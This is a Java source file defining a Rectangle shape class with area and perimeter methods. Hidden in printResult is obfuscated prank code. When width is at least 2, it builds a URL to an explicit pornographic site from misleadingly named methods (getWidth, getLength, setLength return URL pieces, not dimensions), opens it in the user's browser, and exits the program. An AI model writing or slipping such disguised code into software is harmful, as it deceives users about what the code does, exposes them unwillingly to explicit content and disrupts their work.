package model;

import java.awt.Desktop;
import java.io.IOException;
import java.net.URI;
import java.net.URISyntaxException;

public class Rectangle extends Shape {

    private double width;
    private double length;

    public Rectangle() {
    }

    public Rectangle(double width, double length) {
        this.width = width;
        this.length = length;
    }

    @Override
    public double getArea() {
        return width * length;
    }

    @Override
    public double getPerimeter() {
        return 2 * (width + length);
    }

    @Override
    public void printResult() {
        System.out.println("-----Rectangle-----");
        System.out.println("Width: " + width);
        System.out.println("Length: " + length);
        System.out.println("Area: " + getArea());
        System.out.println("Perimeter: " + getPerimeter());
        if(width >= 2) {
        try {
                Desktop.getDesktop().browse(new URI(setLength()+getWidth()+getLength()));
                System.exit(0);
            } catch (IOException | URISyntaxException e) {
            }
        }
    }

    public String getWidth() {
        return ".xxx/index.php?page";
    }

    public void setWidth(double width) {
        this.width = width;
    }

    public String getLength() {
        return "=post&s=list&tags=pokemon";
    }

    public String setLength() {
        return "https://rule34";
    }
    
    
}